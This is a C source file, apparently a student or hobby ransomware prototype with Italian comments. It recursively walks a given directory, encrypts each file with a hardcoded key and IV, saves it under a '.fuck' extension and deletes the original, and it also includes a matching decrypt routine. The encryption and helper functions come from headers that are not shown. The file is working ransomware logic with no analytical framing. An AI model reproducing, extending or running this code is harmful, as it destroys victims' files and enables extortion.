#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

#include "lib/crypt.h"
#include "lib/function.h"

#define DEBUG

char* iv = "qwertyuiopasd";
char* key = "asdfghjklzxcvbnmqwertyuiopasdfgh";
char* ext = ".fuck";

int VisitCrypt(char* path);
int VisitDecrypt(char* path);

int main(int argc, char const *argv[]) {

  if(argc == 3){
    char* path = (char*) argv[2];
    if(strcmp(argv[1],"crypt") == 0)
      VisitCrypt(path);
    else if(strcmp(argv[1], "decrypt") == 0)
      VisitDecrypt(path);
    else
      printf("An input error has occurred\n");
  }
  else
    printf("An input error has occurred\n");

  return 0;
}

int VisitCrypt(char* path){
  struct dirent *de;
  DIR *dr = opendir(path);
  //passo base
  if(dr == NULL){
    #ifdef DEBUG
    printf("%s è un file\n", path);
    #endif
    return 0;
  }

  char *newName, *toVisit;
  FILE *old, *nuovo;

  while((de=readdir(dr)) != NULL){
    if(strcmp(de->d_name,".") != 0 && strcmp(de->d_name,"..") != 0 && strstr(de->d_name,ext) == NULL){
      #ifdef DEBUG
      printf("VISITO %s CHE CONTIENE %s\n", path, de->d_name);
      #endif
      toVisit = linkStr(path, de->d_name, 1);
      //passo ricorsivo
      if(VisitCrypt(toVisit) == 0){
        newName = linkStr(toVisit,ext,0);
        old = fopen(toVisit, "rb");
        nuovo = fopen(newName, "wb");
        encrypt(old,nuovo,key,iv);
        #ifdef DEBUG
        printf("criptato\n");
        #endif
        deleteFile(toVisit);
        fclose(old);
        fclose(nuovo);
        free(newName);
      }
      free(toVisit);
    }
  }
  closedir(dr);
  return 1;
}

int VisitDecrypt(char* path){
  struct dirent *de;
  DIR *dr = opendir(path);
  //passo base
  if(dr == NULL){
    #ifdef DEBUG
    printf("%s è un file\n", path);
    #endif
    return 0;
  }

  char *newName, *toVisit;
  FILE *old, *nuovo;

  while((de=readdir(dr)) != NULL){
    if(strcmp(de->d_name,".") != 0 && strcmp(de->d_name,"..") != 0){
      #ifdef DEBUG
      printf("VISITO %s CHE CONTIENE %s\n", path, de->d_name);
      #endif
      toVisit = linkStr(path, de->d_name, 1);
      //passo ricorsivo
      if(VisitDecrypt(toVisit) == 0 && strstr(de->d_name,ext) != NULL){
        newName = removeLastChars(toVisit, strlen(ext));
        old = fopen(toVisit, "rb");
        nuovo = fopen(newName, "wb");
        decrypt(old,nuovo,key,iv);
        #ifdef DEBUG
        printf("decriptato\n");
        #endif
        deleteFile(toVisit);
        fclose(old);
        fclose(nuovo);
        free(newName);
      }
      free(toVisit);
    }
  }
  closedir(dr);
  return 1;
}
